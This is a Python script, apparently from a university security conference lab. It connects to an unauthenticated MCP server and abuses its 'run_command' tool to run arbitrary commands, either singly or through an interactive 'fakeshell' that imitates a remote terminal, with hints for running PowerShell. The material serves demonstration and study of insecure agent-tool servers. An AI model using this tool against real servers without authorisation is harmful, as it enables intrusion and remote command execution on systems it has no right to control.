# CyberRECon 2026 UW-Madison
# Developed by Mikhail Ortiz-Lunyov
#
# Python client to interact with unauthenticatd MCP server.
# Comes with single-command or "fakeshell" to simulate remote terminal
#
# Confirm your sandbox allows file writing!

# This script contains some ChatGPT-generated content.
# Relevant sections will be identified

# Import libraries
import asyncio
from fastmcp import Client
import fastmcp
import sys

# Check argument length
if len(sys.argv) != 3:
    print("Not enough arguments")
    quit(1)

hostconnect:str = sys.argv[1]

# Attempt to run client
try:
    # client = Client("http://localhost:8000/mcp") # Example
    client = Client("http://"+ hostconnect +":8000/mcp")
except:
    print("Client failed to connect to: "+ "http://"+ hostconnect +":8000/mcp")
    quit(1)

# Define if fakeshell
fakeshell:int = 0
if sys.argv[2] == "fakeshell":
    fakeshell = 1

# Define 'run_command' in client
async def run_command(cmd:str) -> str|None:
    async with client:
        # We call the 'run_command' tool registered on the server
        #  and pass the 'cmd' variable into the 'command' argument
        #
        ## CallToolResult(
        ## ..content=[
        ##   ..TextContent(
        ##     ..type='text',
        ##       text='*',
        ##       annotations=None,
        ##       meta=None
        ##     )
        ##   ],
        ##   structured_content=None,
        ##   meta=None,
        ##   data=None,
        ##   is_error=False
        ## )
        result = await client.call_tool("run_command", {"command": cmd})
        # print(result)
        # for content in result.content:
        #     if content.type == 'text':
        #         print(content.text)
        if result.is_error == False:
            return result.content[0].text
        else:
            return None

# Run any command in argument [SUCCESS!!]
## Fakeshell option
if (fakeshell == 1):
    # Give additional advice
    print()
    print("\tTo run PowerShell cmdlets or their aliases, use the following:")
    print("\t\t\' powershell.exe -Command *cmdlet here* \'")
    while (True):
        # Give prompt
        prompt:str = input("mcp-remote@"+ hostconnect +"$$ ")

        # Implement basic shell commands
        ## exit
        if (prompt == "exit"):
            print("exit")
            break
        ## clear (does not clear)
        elif (prompt == "clear"):
            continue

        # If command fails, print prompt again
        try:
            output = asyncio.run(run_command(prompt))
        except (fastmcp.exceptions.ToolError) as badcommand:
            print(badcommand)
            print("[ "+prompt+" ]")
            continue
        except (Exception) as other:
            print(other)
            continue

        # Print output
        print(output)

## Single command from argument
else:
    output = asyncio.run(run_command(sys.argv[2]))
    print(output)